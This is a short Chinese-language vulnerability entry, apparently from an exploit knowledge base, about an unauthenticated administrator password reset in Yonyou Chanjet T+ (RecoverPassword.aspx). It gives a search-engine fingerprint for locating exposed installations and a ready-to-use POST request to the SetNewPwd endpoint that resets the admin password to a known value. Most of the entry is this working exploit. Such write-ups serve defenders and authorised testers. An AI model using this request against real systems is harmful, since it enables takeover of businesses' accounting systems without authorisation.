# 用友 畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞

## 漏洞描述

用友 畅捷通T+ RecoverPassword.aspx 存在未授权管理员密码修改漏洞，攻击者可以通过漏洞修改管理员账号密码登录后台

## 漏洞影响

<a-checkbox checked>用友 畅捷通T+</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="畅捷通-TPlus"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1662017510454-8bb328d0-35ee-42f9-a36a-625e95a5cfc2.png)

验证POC, 重置账号密码为 `admin/123qwe`

```php
POST /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd

{"pwdNew":"46f94c8de14fb36680850768ff1b7f2a"}
```

![img](../../../.vuepress/public/img/1662032164696-3998d8bc-1adb-4ebe-bf03-caff84a33a26.png)